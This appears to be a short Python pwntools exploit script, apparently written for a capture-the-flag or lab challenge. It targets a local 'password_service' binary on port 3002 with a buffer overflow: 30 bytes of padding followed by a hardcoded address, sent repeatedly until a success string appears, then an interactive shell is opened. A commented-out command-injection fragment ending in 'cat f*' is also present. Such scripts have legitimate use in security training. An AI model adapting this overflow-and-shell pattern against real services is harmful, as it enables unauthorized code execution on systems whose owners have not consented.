from pwn import *
import sys, time
e = ELF('./password_service')
BUFF = 30
cmd_addr = e.symbols['cmd']
log.info("Found %#x" % cmd_addr)

OFFSET = 'g' * 30
PAYLOAD = OFFSET + p32(cmd_addr)
i=0
while True:
    io = remote('localhost', 3002)
    print "I: ", i
    io.sendline("g"*30+p32(0x804872e)) #+"\n"+"2"+"\x27"*6+"|head);cat f* #")
    res = io.recv(timeout=3)
    if "karak" in res:
        print res
        io.interactive()
    i+=1
    io.close()
